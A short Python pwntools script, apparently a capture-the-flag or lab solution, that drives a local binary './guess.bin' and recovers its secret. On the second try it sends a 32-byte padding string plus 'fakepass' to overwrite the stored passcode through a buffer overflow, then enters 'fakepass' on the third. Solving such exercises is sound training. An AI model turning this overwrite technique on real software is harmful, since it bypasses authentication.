#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
      p = process("./guess.bin")

      print(p.recvuntil(b"(Trial 1) What is the passcode? : "))
      p.sendline(b"A"*16) 
      print(p.recvline()) #wrong passwerd

      print(p.recvuntil(b"(Trial 2) What is the passcode? : "))
      p.sendline(b"B"*32 + b"fakepass")
      
      print(p.recvline())  #wrong passwerd

      print(p.recvuntil(b"(Trial 3) What is the passcode? : "))
      p.sendline(b"fakepass")
      
      print(p.recvline())
         
      print(p.recvall()) # secret
if __name__ == "__main__":
    exploit()
